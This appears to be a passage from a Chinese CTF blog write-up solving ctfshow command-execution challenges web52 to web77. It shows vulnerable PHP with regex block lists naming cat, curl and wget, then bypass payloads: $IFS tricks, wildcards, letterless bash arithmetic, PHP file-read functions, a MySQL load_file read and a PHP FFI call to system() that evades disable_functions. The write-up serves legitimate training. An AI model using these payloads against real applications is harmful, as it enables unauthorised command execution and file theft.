+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了尖括号，空格换种方式绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>改变了形式，不再需要命令分隔符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤很严格，但是依旧可以绕过，用通配符和bash</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>
+
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@-[]是linux下的匹配符，是进行匹配的大写字母</span><br></pre></td></tr></table></figure>
+
+<p>起一个文件上传的网页，上传文件抓个包，具体知识点看截图</p>
+<img src="/2020/09/22/ctfshowcommand/1.png" class="">
+
+<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>解法跟55同</p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示flag在36.php文件中，无字母数字构造出36</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，发现命令执行函数基本上都被ban了，这里要寻找其他方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">其他师傅的姿势</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">	readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">下面的payload来自_yu_师傅（感谢）</span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3版本后 该函数已不再被使用</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//过60</span></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//过58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//过58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//过59</span></span><br><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//过60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//过60</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心代码部分没有改变，变得是文件位置，需要对目录结构进行扫描</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#由于后面的文件都是txt文件，所以可以直接用include进行包含</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//过66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//过66-67</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的代码做出了小变化</p>
+<p>可以看到这里会把读到的内容放到内存当中，并且会输出进行了正则替换后的内容，还是有方法进行绕过，让程序提前结束退出即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<h3 id="web72-看-yu-师傅的blog"><a href="#web72-看-yu-师傅的blog" class="headerlink" title="web72(看_yu_师傅的blog)"></a>web72(看_yu_师傅的blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   <span class="comment">//过75,76</span></span><br><span class="line">读取目录</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFI读取</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//访问xxx.txt</span></span><br><span class="line">放一篇文章：https:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2020/09/22/ctfshowcommand/" title="ctfshowcommand">http://yoursite.com/2020/09/22/ctfshowcommand/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/show/" rel="tag"># show</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" rel="prev" title="羊城杯2020">
+      <i class="fa fa-chevron-left"></i> 羊城杯2020
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/24/filecontains/" rel="next" title="filecontains">
+      filecontains <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#command绕过"><span class="nav-number">1.</span> <span class="nav-text">command绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#知识总结，写在前面"><span class="nav-number">1.1.</span> <span class="nav-text">知识总结，写在前面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web29"><span class="nav-number">2.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web30"><span class="nav-number">3.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web31"><span class="nav-number">4.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web32"><span class="nav-number">5.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web33-35-payload同web32，过滤基本相同"><span class="nav-number">6.</span> <span class="nav-text">web33-35(payload同web32，过滤基本相同)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web36"><span class="nav-number">7.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web37-同39"><span class="nav-number">8.</span> <span class="nav-text">web37(同39)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web38"><span class="nav-number">9.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web40"><span class="nav-number">10.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web42"><span class="nav-number">11.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web43"><span class="nav-number">12.</span> <span class="nav-text">web43</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web44"><span class="nav-number">13.</span> <span class="nav-text">web44</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web45"><span class="nav-number">14.</span> <span class="nav-text">web45</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web46"><span class="nav-number">15.</span> <span class="nav-text">web46</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web47"><span class="nav-number">16.</span> <span class="nav-text">web47</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web48"><span class="nav-number">17.</span> <span class="nav-text">web48</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web49"><span class="nav-number">18.</span> <span class="nav-text">web49</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web50-51"><span class="nav-number">19.</span> <span class="nav-text">web50-51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web52"><span class="nav-number">20.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web53"><span class="nav-number">21.</span> <span class="nav-text">web53</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web54"><span class="nav-number">22.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web55"><span class="nav-number">23.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web56"><span class="nav-number">24.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web57"><span class="nav-number">25.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web58"><span class="nav-number">26.</span> <span class="nav-text">web58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web59-web65"><span class="nav-number">27.</span> <span class="nav-text">web59-web65</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web66-web70"><span class="nav-number">28.</span> <span class="nav-text">web66-web70</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web71"><span class="nav-number">29.</span> <span class="nav-text">web71</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web72-看-yu-师傅的blog"><span class="nav-number">30.</span> <span class="nav-text">web72(看_yu_师傅的blog)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web73-74"><span class="nav-number">31.</span> <span class="nav-text">web73-74</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web75-web76"><span class="nav-number">32.</span> <span class="nav-text">web75-web76</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web77"><span class="nav-number">33.</span> <span class="nav-text">web77</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
